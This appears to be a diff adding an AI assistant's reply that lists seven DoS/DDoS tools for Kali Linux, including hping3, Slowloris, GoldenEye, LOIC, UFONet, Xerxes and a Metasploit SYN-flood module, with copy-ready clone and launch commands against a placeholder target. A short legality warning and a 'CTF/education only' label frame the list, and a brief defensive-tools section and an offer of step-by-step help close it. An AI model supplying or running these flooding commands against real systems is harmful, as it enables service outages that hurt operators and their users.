@@ -1,0 +1,126 @@
+For **CTF and educational purposes**, using **DoS/DDoS tools** is usually part of a **red team simulation** or **defensive analysis** challenge. Here's a list of commonly used **DoS/DDoS tools on Kali Linux** that are often used in **legal CTF labs, research, or testing against your own infrastructure**.
+
+> ⚠️ **Important:** Never use these tools against real servers, services, or networks without explicit permission. Unauthorized DoS/DDoS attacks are illegal in most countries.
+
+---
+
+## 🧨 Top DoS/DDoS Tools for Kali Linux (CTF/Education Only)
+
+### 1. **Hping3**
+
+* 🔧 TCP/IP packet crafting tool
+* Useful for simulating SYN floods, UDP floods, etc.
+* ✅ Pre-installed in Kali
+
+```bash
+hping3 -S --flood -V -p 80 <target-ip>
+```
+
+* `-S`: SYN packets
+* `--flood`: Send packets as fast as possible
+* `-p`: Target port
+
+---
+
+### 2. **Slowloris**
+
+* 🌐 Attacks HTTP servers by opening many connections and sending partial headers.
+* Targets **thread exhaustion**.
+
+```bash
+git clone https://github.com/gkbrk/slowloris
+cd slowloris
+python3 slowloris.py <target-ip>
+```
+
+---
+
+### 3. **GoldenEye**
+
+* 🕶 Layer 7 (HTTP) DoS tool
+* Simulates user agents, keeps connections alive.
+
+```bash
+git clone https://github.com/jseidl/GoldenEye
+cd GoldenEye
+python3 goldeneye.py http://<target-ip> -w 100
+```
+
+---
+
+### 4. **LOIC (Low Orbit Ion Cannon)** – GUI & CLI
+
+* 🔫 Very popular in CTFs and demonstrations
+* Easy to use for HTTP/UDP/TCP flooding
+
+```bash
+sudo apt install mono-complete
+git clone https://github.com/NewEraCracker/LOIC
+cd LOIC
+mono LOIC.exe
+```
+
+> ⚠️ Requires Mono (Windows emulation on Linux)
+
+---
+
+### 5. **UFONet**
+
+* ☁️ DDoS via third-party web resources (bots)
+* Can simulate botnet behavior in test labs
+
+```bash
+git clone https://github.com/epsylon/ufonet
+cd ufonet
+./ufonet --attack --target http://target.com
+```
+
+---
+
+### 6. **Xerxes** (used by Anonymous)
+
+* 🔧 Simple yet powerful tool
+* Often compiled manually
+
+```bash
+git clone https://github.com/sepehrdaddev/xerxes
+cd xerxes
+gcc xerxes.c -o xerxes
+./xerxes <target-ip> 80
+```
+
+---
+
+### 7. **Metasploit Modules**
+
+* Kali comes with Metasploit, which has some DoS modules:
+
+```bash
+msfconsole
+use auxiliary/dos/tcp/synflood
+set RHOST <target-ip>
+run
+```
+
+---
+
+## 🧪 Useful for CTF:
+
+* Testing WAF/IDS detection
+* Simulating attacks for defense scenarios
+* Red team challenges (availability testing)
+* Rate limit bypass puzzles
+
+---
+
+## 🛡️ Defense Testing Tools (Optional)
+
+If your goal is **defensive**, try:
+
+* `fail2ban`, `iptables` for mitigation
+* `snort` or `suricata` for detection
+* Logging tools like `tcpdump` or `wireshark`
+
+---
+
+Let me know your **exact CTF setup or objective** (e.g., "simulate a DoS on vulnerable HTTP server running in Docker") and I can guide you step-by-step with safe settings.
